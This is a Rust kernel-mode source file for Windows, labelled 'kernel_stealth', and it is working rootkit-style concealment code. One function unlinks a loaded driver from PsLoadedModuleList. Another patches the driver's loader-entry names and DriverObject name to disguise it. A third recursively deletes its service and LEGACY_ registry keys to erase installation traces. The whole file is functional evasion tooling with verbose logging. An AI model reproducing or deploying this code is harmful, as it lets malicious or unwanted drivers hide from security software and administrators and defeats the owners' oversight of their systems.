#![no_std]

//! Driver stealth helpers: PsLoadedModuleList unlink, module rename, and SCM registry cleanup.

mod log;

use core::ffi::c_void;

use wdk_sys::{DRIVER_OBJECT, NTSTATUS, NT_SUCCESS, STATUS_NOT_FOUND, UNICODE_STRING};

macro_rules! slog {
    ($($arg:tt)*) => {
        $crate::log::print(format_args!("[kernel_stealth] {}", format_args!($($arg)*)))
    };
}

const OBJ_CASE_INSENSITIVE: u32 = 0x0000_0040;
const OBJ_KERNEL_HANDLE: u32 = 0x0000_0200;
const KEY_ALL_ACCESS: u32 = 0xF003F;
const KEY_BASIC_INFORMATION: u32 = 0;
const KEY_VALUE_BASIC_INFORMATION: u32 = 0;

#[repr(C)]
#[derive(Clone, Copy)]
struct ListEntry {
    flink: *mut ListEntry,
    blink: *mut ListEntry,
}

#[repr(C)]
struct LdrDataTableEntry {
    in_load_order_links: ListEntry,
    in_memory_order_links: ListEntry,
    in_initialization_order_links: ListEntry,
}

#[repr(C)]
struct ObjectAttributes {
    length: u32,
    root_directory: *mut c_void,
    object_name: *mut UNICODE_STRING,
    attributes: u32,
    security_descriptor: *mut c_void,
    security_quality_of_service: *mut c_void,
}

#[repr(C)]
struct KeyBasicInformation {
    last_write_time: i64,
    title_index: u32,
    name_length: u32,
    name: [u16; 1],
}

#[repr(C)]
struct KeyValueBasicInformation {
    title_index: u32,
    type_: u32,
    name_length: u32,
    name: [u16; 1],
}

unsafe extern "system" {
    fn ExAcquireResourceExclusiveLite(resource: *mut c_void, wait: u8) -> u8;
    fn ExReleaseResourceLite(resource: *mut c_void);
    fn RtlInitUnicodeString(destination: *mut UNICODE_STRING, source: *const u16);
    fn MmGetSystemRoutineAddress(name: *mut UNICODE_STRING) -> *mut c_void;
    fn MmIsAddressValid(virtual_address: *const c_void) -> u8;
    fn ZwOpenKey(key_handle: *mut *mut c_void, desired_access: u32, object_attributes: *const ObjectAttributes) -> NTSTATUS;
    fn ZwClose(handle: *mut c_void) -> NTSTATUS;
    fn ZwEnumerateKey(
        key_handle: *mut c_void,
        index: u32,
        key_information_class: u32,
        key_information: *mut c_void,
        length: u32,
        result_length: *mut u32,
    ) -> NTSTATUS;
    fn ZwEnumerateValueKey(
        key_handle: *mut c_void,
        index: u32,
        key_value_information_class: u32,
        key_value_information: *mut c_void,
        length: u32,
        result_length: *mut u32,
    ) -> NTSTATUS;
    fn ZwDeleteKey(key_handle: *mut c_void) -> NTSTATUS;
    fn ZwDeleteValueKey(key_handle: *mut c_void, value_name: *mut UNICODE_STRING) -> NTSTATUS;
}

/// Result of [`hide_driver_module`].
#[derive(Clone, Copy, Debug, Default, PartialEq, Eq)]
pub struct ModuleHideResult {
    /// Module unlinked from PsLoadedModuleList.
    pub unlinked: bool,
}

/// Result of [`camouflage_driver_module`].
#[derive(Clone, Copy, Debug, Default, PartialEq, Eq)]
pub struct ModuleCamouflageResult {
    /// `BaseDllName` patched in the loader entry.
    pub base_dll_name: bool,
    /// `FullDllName` patched in the loader entry.
    pub full_dll_name: bool,
    /// `DRIVER_OBJECT.DriverName` patched.
    pub driver_object_name: bool,
    /// Module is not linked in PsLoadedModuleList (e.g. already hidden).
    pub module_not_linked: bool,
}

/// Result of [`delete_service_registry`].
#[derive(Clone, Copy, Debug, Default, PartialEq, Eq)]
pub struct RegistryHideResult {
    /// `\Registry\Machine\System\CurrentControlSet\Services\{name}` removed.
    pub service_key: bool,
    /// `\Registry\Machine\System\CurrentControlSet\Enum\Root\LEGACY_{name}` removed when present.
    pub legacy_enum_key: bool,
}

/// Unlinks the driver image from PsLoadedModuleList using `DriverObject->DriverSection`.
pub fn hide_driver_module(driver: *mut DRIVER_OBJECT) -> ModuleHideResult {
    let mut result = ModuleHideResult::default();
    slog!("hide_driver_module: begin driver={driver:p}");
    if driver.is_null() {
        slog!("hide_driver_module: fail driver=null");
        return result;
    }

    let section = unsafe { (*driver).DriverSection };
    slog!("hide_driver_module: DriverSection={section:p}");
    if section.is_null() {
        slog!("hide_driver_module: fail DriverSection=null");
        return result;
    }

    let Some(resource) = ps_loaded_module_resource() else {
        slog!("hide_driver_module: fail PsLoadedModuleResource not resolved");
        return result;
    };
    slog!("hide_driver_module: PsLoadedModuleResource={resource:p}");

    if unsafe { ExAcquireResourceExclusiveLite(resource, 1) == 0 } {
        slog!("hide_driver_module: fail ExAcquireResourceExclusiveLite");
        return result;
    }

    let entry = section.cast::<LdrDataTableEntry>();
    unsafe {
        let links = &raw mut (*entry).in_load_order_links;
        slog!(
            "hide_driver_module: InLoadOrderLinks entry={entry:p} flink={:p} blink={:p}",
            (*links).flink,
            (*links).blink,
        );
        unlink_list(links);
    }

    unsafe { ExReleaseResourceLite(resource) };
    result.unlinked = true;
    slog!("hide_driver_module: ok unlinked=true");
    result
}

const LDR_FULL_DLL_NAME_OFFSET: usize = 0x48;
const LDR_BASE_DLL_NAME_OFFSET: usize = 0x58;
const POOL_FLAG_NON_PAGED: u32 = 0x0000_0040;
const POOL_TAG_CAMOUFLAGE: u32 = u32::from_ne_bytes(*b"Cmfl");

unsafe extern "system" {
    fn ExAllocatePool2(pool_flags: u32, number_of_bytes: usize, tag: u32) -> *mut c_void;
}

/// Patches loader entry and driver object name strings to disguise the loaded image.
pub fn camouflage_driver_module(
    driver: *mut DRIVER_OBJECT,
    base_name: &str,
    full_path: &str,
    driver_name: &str,
    patch_base: bool,
    patch_full: bool,
    patch_driver_name: bool,
) -> ModuleCamouflageResult {
    let mut result = ModuleCamouflageResult::default();
    slog!(
        "camouflage_driver_module: begin driver={driver:p} base={base_name} full={full_path} obj={driver_name}"
    );

    if driver.is_null() {
        slog!("camouflage_driver_module: fail driver=null");
        return result;
    }
    if base_name.is_empty() {
        slog!("camouflage_driver_module: fail base_name empty");
        return result;
    }
    if !patch_base && !patch_full && !patch_driver_name {
        slog!("camouflage_driver_module: fail no stages requested");
        return result;
    }

    let section = unsafe { (*driver).DriverSection };
    if section.is_null() {
        slog!("camouflage_driver_module: fail DriverSection=null");
        return result;
    }

    if patch_base || patch_full {
        let Some(resource) = ps_loaded_module_resource() else {
            slog!("camouflage_driver_module: fail PsLoadedModuleResource not resolved");
            return result;
        };

        let entry = section.cast::<LdrDataTableEntry>();
        if !is_module_linked(entry) {
            result.module_not_linked = true;
            slog!("camouflage_driver_module: fail module not linked (already hidden?)");
            return result;
        }

        if unsafe { ExAcquireResourceExclusiveLite(resource, 1) == 0 } {
            slog!("camouflage_driver_module: fail ExAcquireResourceExclusiveLite");
            return result;
        }

        if patch_base {
            let wide = match encode_wide_slice(base_name) {
                Some(w) => w,
                None => {
                    unsafe { ExReleaseResourceLite(resource) };
                    slog!("camouflage_driver_module: fail base_name too long");
                    return result;
                }
            };
            let len = wide_len(&wide);
            result.base_dll_name =
                write_ldr_unicode_string(section, LDR_BASE_DLL_NAME_OFFSET, &wide[..len]);
            slog!(
                "camouflage_driver_module: base_dll_name patched={}",
                result.base_dll_name
            );
        }

        if patch_full {
            let wide = match encode_wide_slice(full_path) {
                Some(w) => w,
                None => {
                    unsafe { ExReleaseResourceLite(resource) };
                    slog!("camouflage_driver_module: fail full_path too long");
                    return result;
                }
            };
            let len = wide_len(&wide);
            result.full_dll_name =
                write_ldr_unicode_string(section, LDR_FULL_DLL_NAME_OFFSET, &wide[..len]);
            slog!(
                "camouflage_driver_module: full_dll_name patched={}",
                result.full_dll_name
            );
        }

        unsafe { ExReleaseResourceLite(resource) };
    }

    if patch_driver_name {
        if driver_name.is_empty() {
            slog!("camouflage_driver_module: skip driver_name empty");
        } else {
            let mut wide = [0u16; 512];
            let Some(len) = format_driver_object_name(driver_name, &mut wide) else {
                slog!("camouflage_driver_module: fail driver object name too long");
                return result;
            };
            result.driver_object_name = write_driver_object_name(driver, &wide[..len]);
            slog!(
                "camouflage_driver_module: driver_object_name patched={}",
                result.driver_object_name
            );
        }
    }

    slog!(
        "camouflage_driver_module: done base={} full={} obj={}",
        result.base_dll_name,
        result.full_dll_name,
        result.driver_object_name
    );
    result
}

/// Deletes SCM service registry keys for `service_name` (e.g. `hv`).
pub fn delete_service_registry(service_name: &str) -> RegistryHideResult {
    let mut result = RegistryHideResult::default();
    slog!("delete_service_registry: begin service={service_name}");

    let mut services_path = [0u16; 256];
    if !append_registry_path(
        &mut services_path,
        "\\Registry\\Machine\\System\\CurrentControlSet\\Services\\",
        service_name,
    ) {
        slog!("delete_service_registry: fail services path too long");
        return result;
    }
    result.service_key = delete_registry_tree(&services_path, "Services");
    slog!(
        "delete_service_registry: Services key deleted={}",
        result.service_key
    );

    let mut legacy_path = [0u16; 256];
    if append_registry_path(
        &mut legacy_path,
        "\\Registry\\Machine\\System\\CurrentControlSet\\Enum\\Root\\LEGACY_",
        service_name,
    ) {
        result.legacy_enum_key = delete_registry_tree(&legacy_path, "LEGACY");
        slog!(
            "delete_service_registry: LEGACY key deleted={}",
            result.legacy_enum_key
        );
    } else {
        slog!("delete_service_registry: skip LEGACY path too long");
    }

    slog!(
        "delete_service_registry: done service={} legacy={}",
        result.service_key,
        result.legacy_enum_key
    );
    result
}

fn ps_loaded_module_resource() -> Option<*mut c_void> {
    let mut wide = [0u16; 32];
    if !encode_wide("PsLoadedModuleResource", &mut wide) {
        return None;
    }
    let mut name = UNICODE_STRING::default();
    unsafe { RtlInitUnicodeString(&raw mut name, wide.as_ptr()) };
    let ptr = unsafe { MmGetSystemRoutineAddress(&raw mut name) };
    if ptr.is_null() {
        None
    } else {
        Some(ptr)
    }
}

fn is_valid_kernel_ptr<T>(ptr: *mut T) -> bool {
    if ptr.is_null() {
        return false;
    }
    let addr = ptr as usize;
    if addr < 0xFFFF_8000_0000_0000 {
        return false;
    }
    unsafe { MmIsAddressValid(ptr.cast()) != 0 }
}

fn unlink_list(entry: *mut ListEntry) {
    if !is_valid_kernel_ptr(entry) {
        slog!("unlink_list: skip invalid entry={entry:p}");
        return;
    }
    unsafe {
        let prev = (*entry).blink;
        let next = (*entry).flink;
        let valid_prev = is_valid_kernel_ptr(prev);
        let valid_next = is_valid_kernel_ptr(next);
        slog!(
            "unlink_list: entry={entry:p} prev={prev:p} next={next:p} valid_prev={valid_prev} valid_next={valid_next}"
        );
        if valid_prev {
            (*prev).flink = next;
        } else if !prev.is_null() {
            slog!("unlink_list: skip write prev->Flink prev={prev:p}");
        }
        if valid_next {
            (*next).blink = prev;
        } else if !next.is_null() {
            slog!("unlink_list: skip write next->Blink next={next:p}");
        }
        (*entry).flink = entry;
        (*entry).blink = entry;
        slog!("unlink_list: ok self-linked entry={entry:p}");
    }
}

fn delete_registry_tree(path: &[u16], label: &str) -> bool {
    let end = path.iter().position(|&c| c == 0).unwrap_or(path.len());
    if end == 0 {
        slog!("delete_registry_tree[{label}]: fail empty path");
        return false;
    }

    slog!("delete_registry_tree[{label}]: open path_len={end} chars");

    let mut name = UNICODE_STRING {
        Length: (end * 2) as u16,
        MaximumLength: (path.len() * 2) as u16,
        Buffer: path.as_ptr() as *mut u16,
    };

    let attributes = ObjectAttributes {
        length: size_of::<ObjectAttributes>() as u32,
        root_directory: core::ptr::null_mut(),
        object_name: &raw mut name,
        attributes: OBJ_CASE_INSENSITIVE | OBJ_KERNEL_HANDLE,
        security_descriptor: core::ptr::null_mut(),
        security_quality_of_service: core::ptr::null_mut(),
    };

    let mut key_handle: *mut c_void = core::ptr::null_mut();
    let status = unsafe { ZwOpenKey(&raw mut key_handle, KEY_ALL_ACCESS, &raw const attributes) };
    if !NT_SUCCESS(status) || key_handle.is_null() {
        slog!(
            "delete_registry_tree[{label}]: open failed status={status:#010x} handle={key_handle:p}"
        );
        return false;
    }
    slog!("delete_registry_tree[{label}]: open ok handle={key_handle:p}");

    let deleted = delete_key_recursive(key_handle, label);
    unsafe {
        let _ = ZwClose(key_handle);
    }
    slog!("delete_registry_tree[{label}]: deleted={deleted}");
    deleted
}

fn delete_key_recursive(key_handle: *mut c_void, label: &str) -> bool {
    loop {
        let mut info_buf = [0u8; 512];
        let mut result_length = 0u32;
        let status = unsafe {
            ZwEnumerateKey(
                key_handle,
                0,
                KEY_BASIC_INFORMATION,
                info_buf.as_mut_ptr().cast(),
                info_buf.len() as u32,
                &raw mut result_length,
            )
        };
        if status == STATUS_NOT_FOUND {
            break;
        }
        if !NT_SUCCESS(status) {
            slog!(
                "delete_key_recursive[{label}]: enumerate subkey failed status={status:#010x}"
            );
            return false;
        }

        let info = unsafe { &*(info_buf.as_ptr().cast::<KeyBasicInformation>()) };
        let mut value_name = UNICODE_STRING {
            Length: info.name_length as u16,
            MaximumLength: info.name_length.saturating_add(2) as u16,
            Buffer: info.name.as_ptr() as *mut u16,
        };

        let sub_attributes = ObjectAttributes {
            length: size_of::<ObjectAttributes>() as u32,
            root_directory: key_handle,
            object_name: &raw mut value_name,
            attributes: OBJ_CASE_INSENSITIVE | OBJ_KERNEL_HANDLE,
            security_descriptor: core::ptr::null_mut(),
            security_quality_of_service: core::ptr::null_mut(),
        };

        let mut sub_handle: *mut c_void = core::ptr::null_mut();
        let open_status =
            unsafe { ZwOpenKey(&raw mut sub_handle, KEY_ALL_ACCESS, &raw const sub_attributes) };
        if NT_SUCCESS(open_status) && !sub_handle.is_null() {
            slog!("delete_key_recursive[{label}]: recurse sub_handle={sub_handle:p}");
            let _ = delete_key_recursive(sub_handle, label);
            unsafe {
                let _ = ZwClose(sub_handle);
            }
        } else {
            slog!(
                "delete_key_recursive[{label}]: subkey open failed status={open_status:#010x}"
            );
        }
    }

    loop {
        let mut info_buf = [0u8; 512];
        let mut result_length = 0u32;
        let status = unsafe {
            ZwEnumerateValueKey(
                key_handle,
                0,
                KEY_VALUE_BASIC_INFORMATION,
                info_buf.as_mut_ptr().cast(),
                info_buf.len() as u32,
                &raw mut result_length,
            )
        };
        if status == STATUS_NOT_FOUND {
            break;
        }
        if !NT_SUCCESS(status) {
            slog!(
                "delete_key_recursive[{label}]: enumerate value failed status={status:#010x}"
            );
            return false;
        }

        let info = unsafe { &*(info_buf.as_ptr().cast::<KeyValueBasicInformation>()) };
        let mut value_name = UNICODE_STRING {
            Length: info.name_length as u16,
            MaximumLength: info.name_length.saturating_add(2) as u16,
            Buffer: info.name.as_ptr() as *mut u16,
        };
        unsafe {
            let _ = ZwDeleteValueKey(key_handle, &raw mut value_name);
        }
    }

    let delete_status = unsafe { ZwDeleteKey(key_handle) };
    let ok = NT_SUCCESS(delete_status);
    slog!(
        "delete_key_recursive[{label}]: ZwDeleteKey status={delete_status:#010x} ok={ok}"
    );
    ok
}

fn append_registry_path(out: &mut [u16], prefix: &str, suffix: &str) -> bool {
    let mut index = 0usize;
    for unit in prefix.encode_utf16().chain(suffix.encode_utf16()) {
        if index + 1 >= out.len() {
            return false;
        }
        out[index] = unit;
        index += 1;
    }
    if index >= out.len() {
        return false;
    }
    out[index] = 0;
    true
}

fn encode_wide(input: &str, out: &mut [u16]) -> bool {
    let mut index = 0usize;
    for unit in input.encode_utf16() {
        if index + 1 >= out.len() {
            return false;
        }
        out[index] = unit;
        index += 1;
    }
    if index >= out.len() {
        return false;
    }
    out[index] = 0;
    true
}

fn encode_wide_slice(input: &str) -> Option<[u16; 512]> {
    let mut out = [0u16; 512];
    let mut index = 0usize;
    for unit in input.encode_utf16() {
        if index >= out.len() {
            return None;
        }
        out[index] = unit;
        index += 1;
    }
    Some(out)
}

fn wide_len(units: &[u16; 512]) -> usize {
    units.iter().position(|&c| c == 0).unwrap_or(units.len())
}

fn format_driver_object_name(name: &str, out: &mut [u16; 512]) -> Option<usize> {
    let mut index = 0usize;
    let segments: [&str; 2] = if name.starts_with("\\Driver\\") {
        [name, ""]
    } else {
        ["\\Driver\\", name]
    };
    for segment in segments {
        if segment.is_empty() {
            continue;
        }
        for unit in segment.encode_utf16() {
            if index + 1 >= out.len() {
                return None;
            }
            out[index] = unit;
            index += 1;
        }
    }
    Some(index)
}

fn is_module_linked(entry: *mut LdrDataTableEntry) -> bool {
    if !is_valid_kernel_ptr(entry) {
        return false;
    }
    unsafe {
        let links = &raw mut (*entry).in_load_order_links;
        (*links).flink != links && (*links).blink != links
    }
}

fn write_ldr_unicode_string(section: *mut c_void, field_offset: usize, wide: &[u16]) -> bool {
    if wide.is_empty() {
        return false;
    }
    let byte_len = wide.len() * core::mem::size_of::<u16>();
    let alloc_len = byte_len + core::mem::size_of::<u16>();
    let buf = unsafe { ExAllocatePool2(POOL_FLAG_NON_PAGED, alloc_len, POOL_TAG_CAMOUFLAGE) };
    if buf.is_null() {
        return false;
    }
    unsafe {
        core::ptr::copy_nonoverlapping(wide.as_ptr(), buf.cast::<u16>(), wide.len());
        *buf.add(byte_len).cast::<u16>() = 0;
        let us = section.cast::<u8>().add(field_offset).cast::<UNICODE_STRING>();
        (*us).Length = byte_len as u16;
        (*us).MaximumLength = alloc_len as u16;
        (*us).Buffer = buf.cast::<u16>();
    }
    true
}

fn write_driver_object_name(driver: *mut DRIVER_OBJECT, wide: &[u16]) -> bool {
    if wide.is_empty() {
        return false;
    }
    let byte_len = wide.len() * core::mem::size_of::<u16>();
    let alloc_len = byte_len + core::mem::size_of::<u16>();
    let buf = unsafe { ExAllocatePool2(POOL_FLAG_NON_PAGED, alloc_len, POOL_TAG_CAMOUFLAGE) };
    if buf.is_null() {
        return false;
    }
    unsafe {
        core::ptr::copy_nonoverlapping(wide.as_ptr(), buf.cast::<u16>(), wide.len());
        *buf.add(byte_len).cast::<u16>() = 0;
        (*driver).DriverName.Length = byte_len as u16;
        (*driver).DriverName.MaximumLength = alloc_len as u16;
        (*driver).DriverName.Buffer = buf.cast::<u16>();
    }
    true
}
